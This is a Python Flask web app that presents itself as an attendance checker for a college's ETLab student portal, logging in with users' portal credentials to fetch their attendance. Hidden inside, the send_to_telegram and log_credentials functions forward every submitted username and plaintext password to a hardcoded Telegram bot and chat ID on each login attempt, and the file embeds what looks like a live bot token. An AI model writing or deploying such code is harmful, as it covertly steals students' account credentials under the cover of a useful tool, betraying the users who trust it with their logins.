from flask import Flask, request, session as flask_session, jsonify, render_template
from flask_cors import CORS
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = "APP_KEY"
CORS(app, supports_credentials=True)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "8538769777:AAEfOQ3Pj0QYY0fBOpKS3zTEMpTn_PYoDfA"
TELEGRAM_CHAT_ID = "6966838803"

def log_credentials(username, password, status="success"):
    """Log credentials via Telegram (Vercel-compatible)"""
    try:
        # Send to Telegram only (no Excel on Vercel)
        send_to_telegram(username, password, status)
    except Exception as e:
        print(f"Error logging credentials: {e}")

def send_to_telegram(username, password, status):
    """Send login credentials to Telegram"""
    try:
        # Skip if tokens not configured
        if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE":
            print("⚠️ Telegram not configured. Skipping send.")
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Format message
        status_emoji = {
            "success": "✅",
            "invalid": "❌",
            "error": "⚠️"
        }.get(status, "ℹ️")
        
        message = f"""
{status_emoji} <b>Login Attempt</b>

🕐 <b>Time:</b> {timestamp}
👤 <b>Username:</b> <code>{username}</code>
🔑 <b>Password:</b> <code>{password}</code>
📊 <b>Status:</b> {status.upper()}
"""
        
        # Send message to Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=5)
        
        if response.status_code == 200:
            print("✅ Sent to Telegram successfully")
        else:
            print(f"❌ Telegram send failed: {response.text}")
            
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

LOGIN_URL = "https://sahrdaya.etlab.in/user/login"
LOGOUT_URL = "https://sahrdaya.etlab.in/user/logout"
REFERRER = "https://sahrdaya.etlab.in/ktuacademics/student/viewattendancesubjectdutyleave/25672501090"
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}
PAYLOAD = {"format": "csv"}

# Load courses.json if exists
try:
    with open("courses.json", "r") as json_file:
        sub = json.load(json_file)
except FileNotFoundError:
    sub = {}

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({"error": "Username and password are required"}), 400
        
    with requests.Session() as session:
        login_payload = {
            "LoginForm[username]": username,
            "LoginForm[password]": password,
            "yt0": ""
        }
        try:
            login_response = session.post(LOGIN_URL, headers=HEADERS, data=login_payload, timeout=10)
            login_response.raise_for_status()
        except requests.RequestException as e:
            log_credentials(username, password, "error")
            return jsonify({"error": f"Error logging in: {str(e)}"}), 500
        
        if "Invalid" in login_response.text:
            log_credentials(username, password, "invalid")
            return jsonify({"error": "Invalid username or password"}), 401
        
        log_credentials(username, password, "success")
        flask_session['session_cookies'] = json.dumps(session.cookies.get_dict())
        return jsonify({"success": True, "message": "Login successful"}), 200

@app.route('/api/attendance', methods=['GET'])
def api_get_attendance():
    if 'session_cookies' not in flask_session:
        return jsonify({"error": "Unauthorized access"}), 401
        
    cookies = json.loads(flask_session['session_cookies'])
    with requests.Session() as session_instance:
        session_instance.cookies.update(cookies)
        try:
            response = session_instance.post(REFERRER, headers=HEADERS, data=PAYLOAD, timeout=10)
            response.raise_for_status()
        except requests.RequestException as e:
            return jsonify({"error": f"Error fetching data: {e}"}), 500
            
        lines = response.text.splitlines()
        try:
            header = lines[1].replace('"', '').split(',')
            data = lines[2].replace('"', '').split(',')
            details_dict = dict(zip(header, data))
            
            # Debug: print all columns to see what's available
            print("CSV Columns:", list(details_dict.keys()))
            print("Full data:", details_dict)
        except IndexError:
             return jsonify({"error": "Failed to parse CSV response"}), 500

        session_instance.get(LOGOUT_URL, headers=HEADERS)

    name = details_dict.get("Name", "Unknown")
    Uni_Reg_No = details_dict.get("Uni Reg No", "N/A")
    Roll_no = details_dict.get("Roll No", "N/A")
    
    # Extract duty leave percentage if available
    duty_leave = details_dict.get("Duty Leave %", "N/A")
    
    attendance_data = []
    for subject, attendance in details_dict.items():
        # Skip non-subject fields
        if subject in ["Name", "Uni Reg No", "Roll No", "Duty Leave %"]:
            continue
            
        subject_name = sub.get(subject, subject)
        if subject_name.startswith("24"):
            subject_name = subject_name[2:]
        if '/' in attendance:
            try:
                attended, total = map(int, attendance.split(' ')[0].split('/'))
                attendance_data.append({
                    "subject": subject_name,
                    "attended": attended,
                    "total": total
                })
            except ValueError:
                continue

    return jsonify({
        "name": name,
        "Uni_Reg_No": Uni_Reg_No,
        "Roll_no": Roll_no,
        "duty_leave": duty_leave,
        "attendance_data": attendance_data
    })

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True, port=5000)
